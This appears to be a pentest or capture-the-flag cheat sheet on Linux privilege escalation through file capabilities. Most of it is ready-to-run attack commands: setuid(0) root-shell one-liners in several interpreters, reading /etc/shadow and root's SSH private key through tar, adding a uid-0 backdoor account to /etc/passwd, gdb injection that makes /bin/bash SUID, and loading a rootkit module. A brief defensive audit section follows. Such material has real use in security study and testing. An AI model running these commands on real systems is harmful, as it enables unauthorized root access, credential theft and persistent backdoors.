# Linux Capabilities Privilege Escalation Checklist

## What are Capabilities?

Linux capabilities divide root privileges into smaller units. A binary with specific capabilities can perform privileged operations without being SUID root.

---

## Finding Capabilities

```bash
# Find all files with capabilities
getcap -r / 2>/dev/null

# Check specific binary
getcap /path/to/binary

# With more details
getcap -v /path/to/binary
```

---

## Dangerous Capabilities

### cap_setuid (Most Dangerous)

Allows setting UID. Can become root.

```bash
# Python with cap_setuid
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# PHP with cap_setuid
./php -r "posix_setuid(0); system('/bin/bash');"

# Ruby with cap_setuid  
./ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### cap_setgid

Allows setting GID. Can join any group.

```bash
# Python with cap_setgid
./python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'
```

### cap_dac_read_search

Bypass file read permission checks. Can read any file.

```bash
# tar with cap_dac_read_search
./tar -cvf shadow.tar /etc/shadow
./tar -xvf shadow.tar
cat etc/shadow

# Binary can read /etc/shadow, SSH keys, etc.
```

### cap_dac_override

Bypass file write permission checks. Can write to any file.

```bash
# Write to /etc/passwd
./vim /etc/passwd
# Add: hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash

# Or modify /etc/shadow
./vim /etc/shadow
```

### cap_chown

Can change ownership of any file.

```bash
# Take ownership of sensitive files
./chown user:user /etc/shadow
./chown user:user /etc/passwd
```

### cap_fowner

Bypass permission checks on owner operations.

```bash
# Can chmod any file
./chmod 777 /etc/shadow
```

### cap_net_raw

Can use raw sockets. Useful for sniffing.

```bash
# Sniff network traffic
./tcpdump -i eth0 -w capture.pcap
```

### cap_net_bind_service

Can bind to privileged ports (< 1024).

```bash
# Start listener on port 80
./nc -lvnp 80
./python3 -m http.server 80
```

### cap_sys_admin

Very broad capability. Almost like root.

```bash
# Can mount filesystems, load kernel modules, etc.
```

### cap_sys_ptrace

Can trace/debug processes. Can inject into running processes.

```bash
# Inject into root process
./gdb -p <root_pid>
```

### cap_sys_module

Can load kernel modules.

```bash
# Load malicious kernel module
./insmod rootkit.ko
```

---

## Exploitation Examples

### Python with cap_setuid

```bash
# Check capability
getcap /usr/bin/python3
# /usr/bin/python3 = cap_setuid+ep

# Exploit
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Vim with cap_dac_override

```bash
# Check capability
getcap /usr/bin/vim
# /usr/bin/vim = cap_dac_override+ep

# Exploit - Add user to passwd
/usr/bin/vim /etc/passwd
# Add line: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash
# Password: hacker

# Switch to new user
su hacker
```

### Tar with cap_dac_read_search

```bash
# Check capability  
getcap /usr/bin/tar
# /usr/bin/tar = cap_dac_read_search+ep

# Read /etc/shadow
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow

# Read SSH keys
/usr/bin/tar -cvf keys.tar /root/.ssh/
/usr/bin/tar -xvf keys.tar
cat root/.ssh/id_rsa
```

### PHP with cap_setuid

```bash
# Check capability
getcap /usr/bin/php
# /usr/bin/php = cap_setuid+ep

# Exploit
/usr/bin/php -r "posix_setuid(0); system('/bin/bash');"
```

### Gdb with cap_sys_ptrace

```bash
# Check capability
getcap /usr/bin/gdb
# /usr/bin/gdb = cap_sys_ptrace+ep

# Find root process
ps aux | grep root

# Attach and inject
/usr/bin/gdb -p <pid>
(gdb) call (void)system("chmod u+s /bin/bash")
(gdb) quit

/bin/bash -p
```

### Node with cap_setuid

```bash
# Check capability
getcap /usr/bin/node
# /usr/bin/node = cap_setuid+ep

# Exploit
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

---

## Capability Flags

| Flag | Meaning |
|------|---------|
| `+ep` | Effective and Permitted - Can use capability |
| `+ei` | Effective and Inheritable - Passed to child processes |
| `+p` | Permitted only - Must be enabled to use |
| `+i` | Inheritable only - Passed to children |
| `+e` | Effective only - Can use right away |

---

## Defensive Checks

```bash
# List all capabilities on system
getcap -r / 2>/dev/null

# Audit for dangerous capabilities
getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_setgid|cap_dac|cap_chown|cap_fowner|cap_sys_admin|cap_sys_ptrace|cap_sys_module'

# Check process capabilities
cat /proc/self/status | grep Cap
# Decode with:
capsh --decode=<hex_value>
```

---

## Setting Capabilities (When You Have Root)

```bash
# Set capability on binary
setcap cap_setuid+ep /path/to/binary

# Remove capability
setcap -r /path/to/binary

# Copy binary and set capability
cp /usr/bin/python3 /tmp/python3
setcap cap_setuid+ep /tmp/python3
```



